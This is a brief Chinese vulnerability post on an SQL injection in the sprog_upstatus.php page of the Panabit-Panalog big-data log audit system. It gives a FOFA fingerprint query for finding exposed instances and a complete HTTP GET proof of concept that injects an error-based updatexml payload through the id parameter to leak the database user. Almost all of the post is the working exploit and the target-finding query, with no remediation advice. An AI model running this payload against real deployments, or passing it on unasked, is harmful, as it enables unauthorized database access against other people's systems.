# 北京派网软件有限公司Panabit-Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞

北京派网软件有限公司Panabit-Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞，攻击者利用该漏洞可获取数据库权限。

## fofa

```java
body="Maintain/cloud_index.php"
```

## poc

```java
GET /Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,user()),0)&rdb=1 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: PHPSESSID=f8la8ttr74fkge0pttpc626p45
```

![image-20240730213144361](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302131431.png)